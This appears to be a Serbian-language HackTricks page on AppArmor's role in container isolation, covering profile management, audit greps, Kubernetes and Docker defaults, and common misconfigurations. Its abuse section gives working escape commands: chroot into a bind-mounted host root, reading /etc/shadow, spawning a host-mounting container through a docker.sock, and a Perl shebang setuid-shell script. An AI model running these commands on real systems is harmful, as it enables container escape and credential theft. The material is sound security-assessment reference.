# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Uloga u izolaciji kontejnera

AppArmor je sistem **obavezne kontrole pristupa** koji primenjuje ograničenja putem profila za pojedinačne programe. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva korisnika i grupe, AppArmor omogućava kernelu da primeni politiku pridruženu samom procesu. U kontejnerskim okruženjima ovo je važno zato što workload može imati dovoljno tradicionalnih privilegija da pokuša neku radnju, a da i dalje bude odbijen jer njegov AppArmor profil ne dozvoljava relevantnu putanju, mount, mrežno ponašanje ili upotrebu capability-ja.

Najvažnija konceptualna tačka jeste da je AppArmor **zasnovan na putanjama**. Pristup filesystemu razmatra kroz pravila putanja, a ne kroz labele, kao što to radi SELinux. Zbog toga je pristupačan i moćan, ali to takođe znači da bind mount-ovi i alternativni rasporedi putanja zahtevaju pažljivu analizu. Ako isti sadržaj sa hosta postane dostupan pod drugačijom putanjom, efekat politike možda neće biti ono što je operator prvobitno očekivao.

## Uloga u izolaciji kontejnera

Provere bezbednosti kontejnera često se zaustavljaju na capabilities i seccomp-u, ali AppArmor ostaje važan i nakon tih provera. Zamislite kontejner koji ima više privilegija nego što bi trebalo ili workload kojem je iz operativnih razloga bila potrebna još jedna capability. AppArmor i dalje može ograničiti pristup fajlovima, ponašanje mount-ova, networking i obrasce izvršavanja na načine koji zaustavljaju očigledan abuse path. Zato deaktiviranje AppArmor-a „samo da bi aplikacija radila“ može neprimetno pretvoriti konfiguraciju koja je samo rizična u onu koja je aktivno exploitable.

## Laboratorija

Da biste proverili da li je AppArmor aktivan na hostu, koristite:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Da biste videli pod kojim korisnikom trenutno radi proces kontejnera:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Razlika je poučna. U uobičajenom slučaju, proces bi trebalo da prikazuje AppArmor kontekst povezan sa profileom koji je izabrao runtime. U slučaju `unconfined`, taj dodatni sloj ograničenja nestaje.

Možete proveriti i šta Docker smatra da je primenio:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Upotreba tokom izvršavanja

Docker može da primeni podrazumevani ili prilagođeni AppArmor profil kada ga host podržava. Podman takođe može da se integriše sa AppArmor-om na sistemima zasnovanim na AppArmor-u, iako na distribucijama koje prvenstveno koriste SELinux drugi MAC sistem često ima glavnu ulogu. Kubernetes može da izloži AppArmor policy na nivou workload-a na nodovima koji zaista podržavaju AppArmor. LXC i srodna Ubuntu-family system-container okruženja takođe u velikoj meri koriste AppArmor.

Praktična poenta je da AppArmor nije „Docker feature“. To je funkcija host-kernela koju više runtime-a može da primeni. Ako ga host ne podržava ili je runtime-u naloženo da radi unconfined, navodna zaštita zapravo ne postoji.

Konkretno za Kubernetes, moderni API je `securityContext.appArmorProfile`. Od Kubernetes verzije `v1.30`, starije beta AppArmor annotations su deprecated. Na podržanim hostovima, `RuntimeDefault` je podrazumevani profil, dok `Localhost` upućuje na profil koji već mora biti učitan na nodu. Ovo je važno tokom review-a zato što manifest može izgledati kao da podržava AppArmor, a da i dalje u potpunosti zavisi od podrške na nodu i prethodno učitanih profila.

Jedan suptilan, ali koristan operativni detalj jeste da je eksplicitno postavljanje `appArmorProfile.type: RuntimeDefault` strože od jednostavnog izostavljanja ovog polja. Ako je polje eksplicitno postavljeno, a nod ne podržava AppArmor, admission bi trebalo da ne uspe. Ako je polje izostavljeno, workload i dalje može da se pokrene na nodu bez AppArmor-a i jednostavno neće dobiti taj dodatni sloj confinement-a. Iz ugla attackera, ovo je dobar razlog da proveri i manifest i stvarno stanje noda.

Na Docker-capable AppArmor hostovima, najpoznatiji podrazumevani profil je `docker-default`. Taj profil se generiše iz Moby AppArmor template-a i važan je zato što objašnjava zašto neki capability-based PoC-ovi i dalje ne uspevaju u podrazumevanom container-u. Uopšteno, `docker-default` dozvoljava uobičajeno umrežavanje, zabranjuje upis u veliki deo `/proc`, zabranjuje pristup osetljivim delovima `/sys`, blokira mount operacije i ograničava ptrace tako da ne predstavlja opštu primitivu za probing hosta. Razumevanje te baseline konfiguracije pomaže da se napravi razlika između toga da „container ima `CAP_SYS_ADMIN`“ i toga da „container zaista može da koristi tu capability protiv kernel interfejsa koji me zanimaju“.

## Upravljanje profilima

AppArmor profili se obično čuvaju u `/etc/apparmor.d/`. Uobičajena konvencija imenovanja jeste zamena kosih crta u putanji izvršne datoteke tačkama. Na primer, profil za `/usr/bin/man` se obično čuva kao `/etc/apparmor.d/usr.bin.man`. Ovaj detalj je važan i tokom odbrane i tokom assessment-a, zato što nakon utvrđivanja naziva aktivnog profila često možete brzo pronaći odgovarajuću datoteku na hostu.

Korisne komande za upravljanje sa strane hosta uključuju:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Razlog zbog kog su ove komande važne u referenci za bezbednost container-a jeste to što objašnjavaju kako se profili zapravo kreiraju, učitavaju, prebacuju u complain mode i menjaju nakon izmena aplikacije. Ako operator ima naviku da tokom rešavanja problema prebaci profile u complain mode i zaboravi da ponovo uključi enforcement, container u dokumentaciji može izgledati zaštićeno, dok se u stvarnosti ponaša mnogo manje restriktivno.

### Kreiranje i ažuriranje profila

`aa-genprof` može da prati ponašanje aplikacije i pomogne u interaktivnom generisanju profila:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` može da generiše šablon profila koji se kasnije može učitati pomoću `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Kada se binarni fajl promeni i pravila politike treba ažurirati, `aa-logprof` može ponovo obraditi odbijanja pronađena u logovima i pomoći operatoru da odluči da li da ih dozvoli ili odbije:
```bash
sudo aa-logprof
```
### Dnevnici

AppArmor odbijanja su često vidljiva kroz `auditd`, syslog ili alate kao što je `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Ovo je korisno u operativnom i ofanzivnom smislu. Defenders ga koriste za preciznije definisanje profila. Attackers ga koriste da saznaju koja se tačna putanja ili operacija odbija i da li je AppArmor kontrola koja blokira exploit chain.

### Identifikovanje Tačne Datoteke Profila

Kada runtime prikaže određeni naziv AppArmor profila za container, često je korisno povezati taj naziv sa datotekom profila na disku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Ovo je naročito korisno tokom pregleda na hostu jer premošćava razliku između toga da „container navodi da radi pod profilom `lowpriv`“ i toga da se „stvarna pravila nalaze u ovoj konkretnoj datoteci koja može da se audit-uje ili ponovo učita“.

### Pravila visoke vrednosti za audit

Kada možete da pročitate profil, nemojte se zaustaviti na jednostavnim `deny` linijama. Nekoliko tipova pravila značajno menja koliko će AppArmor biti koristan protiv pokušaja bekstva iz containera:

- `ux` / `Ux`: izvršavaju ciljnu binarnu datoteku kao unconfined. Ako je neki dostupan helper, shell ili interpreter dozvoljen pod `ux`, to je obično prva stvar koju treba testirati.
- `px` / `Px` i `cx` / `Cx`: obavljaju profile transitions pri exec-u. Ona nisu automatski loša, ali ih vredi audit-ovati jer transition može dovesti do mnogo šireg profila od trenutnog.
- `change_profile`: omogućava task-u da pređe u drugi učitani profil, odmah ili pri sledećem exec-u. Ako je odredišni profil slabiji, ovo može postati predviđeni escape hatch iz restriktivnog domena.
- `flags=(complain)`, `flags=(unconfined)` ili noviji `flags=(prompt)`: ovo treba da utiče na to koliko poverenja polažete u profil. `complain` beleži denials umesto da ih sprovodi, `unconfined` uklanja granicu, a `prompt` zavisi od userspace decision path-a umesto od čistog deny-a koji sprovodi kernel.
- `userns` ili `userns create,`: novija AppArmor policy može da kontroliše kreiranje user namespace-ova. Ako profil containera to izričito dozvoljava, nested user namespace-ovi ostaju mogući čak i kada platforma koristi AppArmor kao deo svoje hardening strategije.

Korisni grep na hostu:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ova vrsta audit-a je često korisnija od pregledanja stotina običnih pravila za fajlove. Ako breakout zavisi od izvršavanja helper-a, ulaska u novi namespace ili prelaska u manje restriktivan profil, odgovor je često skriven u ovim pravilima usmerenim na tranzicije, a ne u očiglednim linijama u stilu `deny /etc/shadow r`.

## Pogrešne konfiguracije

Najočiglednija greška je `apparmor=unconfined`. Administratori ga često podese tokom debug-ovanja aplikacije koja nije radila zato što je profil ispravno blokirao nešto opasno ili neočekivano. Ako ova zastavica ostane u produkciji, ceo MAC sloj je praktično uklonjen.

Drugi, suptilniji problem jeste pretpostavka da su bind mounts bezopasni zato što dozvole nad fajlovima izgledaju normalno. Pošto je AppArmor zasnovan na putanjama, izlaganje host putanja pod alternativnim lokacijama za mount može loše da utiče na pravila putanja. Treća greška je zaboravljanje da ime profila u konfiguracionom fajlu ne znači mnogo ako kernel hosta zapravo ne primenjuje AppArmor.

## Zloupotreba

Kada AppArmor nestane, operacije koje su ranije bile ograničene mogu iznenada početi da rade: čitanje osetljivih putanja kroz bind mounts, pristup delovima procfs-a ili sysfs-a koji su trebalo da budu teži za korišćenje, izvršavanje radnji povezanih sa mount-om ako ih capabilities/seccomp takođe dozvoljavaju ili korišćenje putanja koje bi profil normalno odbio. AppArmor je često mehanizam koji objašnjava zašto pokušaj breakout-a zasnovan na capabilities „na papiru treba da radi“, ali u praksi ipak ne uspeva. Uklonite AppArmor i isti pokušaj može početi da uspeva.

Ako sumnjate da je AppArmor glavna stvar koja sprečava path-traversal, bind-mount ili mount-based abuse chain, prvi korak je obično poređenje onoga čemu se može pristupiti sa profilom i bez njega. Na primer, ako je host putanja mount-ovana unutar containera, počnite proverom da li možete da joj pristupite i da je čitate:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ako kontejner takođe ima opasan `CAP_SYS_ADMIN` capability, jedan od najpraktičnijih testova jeste provera da li je AppArmor kontrola koja blokira mount operacije ili pristup osetljivim kernel datotečnim sistemima:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
U okruženjima u kojima je putanja hosta već dostupna putem bind mount-a, gubitak AppArmor-a takođe može pretvoriti problem otkrivanja informacija samo za čitanje u direktan pristup fajlovima hosta:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Poenta ovih komandi nije u tome da AppArmor sam po sebi omogućava breakout. Poenta je da, nakon uklanjanja AppArmor-a, mnoge putanje zloupotrebe filesystem-a i mount-a odmah postaju testabilne.

### Potpun primer: AppArmor onemogućen + host root mountovan

Ako je host root već bind-mountovan u kontejner na `/host`, uklanjanje AppArmor-a može pretvoriti blokiranu putanju zloupotrebe filesystem-a u potpun host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Kada se shell izvršava kroz host filesystem, workload je praktično izašao iz granica containera:
```bash
id
hostname
cat /etc/shadow | head
```
### Onemogućen AppArmor + Runtime Socket

Ako je stvarna prepreka bio AppArmor oko runtime stanja, montirani socket može biti dovoljan za potpuno bekstvo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tačna putanja zavisi od tačke montiranja, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, a runtime API može pokrenuti container koji kompromituje host.

### Potpuni primer: Zaobilaženje Bind-Mount zaštite zasnovano na putanji

Pošto je AppArmor zasnovan na putanjama, zaštita `/proc/**` ne štiti automatski isti host procfs sadržaj kada mu se može pristupiti kroz drugu putanju:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Uticaj zavisi od toga šta je tačno montirano i da li alternativna putanja takođe zaobilazi druge kontrole, ali ovaj obrazac je jedan od najjasnijih razloga zbog kojih AppArmor treba procenjivati zajedno sa rasporedom mount-ova, a ne izolovano.

### Potpun primer: Shebang Bypass

AppArmor policy ponekad cilja putanju interpreter-a na način koji ne uzima u potpunosti u obzir izvršavanje script-a putem shebang obrade. Istorijski primer obuhvatao je korišćenje script-a čiji prvi red upućuje na ograničeni interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ova vrsta primera je važna kao podsetnik da se namena profila i stvarna semantika izvršavanja mogu razlikovati. Prilikom pregleda AppArmor-a u container okruženjima, lancima interpretera i alternativnim putanjama izvršavanja treba posvetiti posebnu pažnju.

## Provere

Cilj ovih provera je da brzo odgovore na tri pitanja: da li je AppArmor omogućen na hostu, da li je trenutni proces ograničen i da li je runtime zaista primenio profil na ovaj container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Šta je ovde bitno:

- Ako `/proc/self/attr/current` prikazuje `unconfined`, workload nema koristi od AppArmor confinement-a.
- Ako `aa-status` prikazuje da je AppArmor onemogućen ili nije učitan, bilo koje ime profila u runtime konfiguraciji je uglavnom samo kozmetičko.
- Ako `docker inspect` prikazuje `unconfined` ili neočekivani prilagođeni profil, to je često razlog zbog kog filesystem ili mount-based abuse putanja funkcioniše.
- Ako `/sys/kernel/security/apparmor/profiles` ne sadrži profil koji ste očekivali, konfiguracija runtime-a ili orchestrator-a sama po sebi nije dovoljna.
- Ako navodno hardened profil sadrži pravila u stilu `ux`, široki `change_profile`, `userns` ili `flags=(complain)`, praktična granica može biti mnogo slabija nego što naziv profila sugeriše.

Ako container već ima povišene privilegije iz operativnih razloga, ostavljanje AppArmor-a uključenim često predstavlja razliku između kontrolisanog izuzetka i mnogo šireg security failure-a.

## Podrazumevane vrednosti runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano uključen na hostovima koji podržavaju AppArmor | Koristi `docker-default` AppArmor profil, osim ako nije drugačije podešeno | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zavisi od hosta | AppArmor je podržan putem `--security-opt`, ali tačno podrazumevano ponašanje zavisi od hosta/runtime-a i manje je univerzalno od Docker-ovog dokumentovanog `docker-default` profila | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Uslovno podrazumevano ponašanje | Ako `appArmorProfile.type` nije naveden, podrazumevana vrednost je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućen na node-u | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profilom, node-ovi bez AppArmor podrške |
| containerd / CRI-O under Kubernetes | Prati podršku node-a/runtime-a | Uobičajeni Kubernetes-supported runtime-i podržavaju AppArmor, ali enforcement i dalje zavisi od podrške node-a i podešavanja workload-a | Isto kao u Kubernetes redu; direktna konfiguracija runtime-a takođe može u potpunosti preskočiti AppArmor |

Kod AppArmor-a je najvažnija promenljiva često **host**, a ne samo runtime. Podešavanje profila u manifestu ne stvara confinement na node-u na kom AppArmor nije omogućen.

## Reference

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
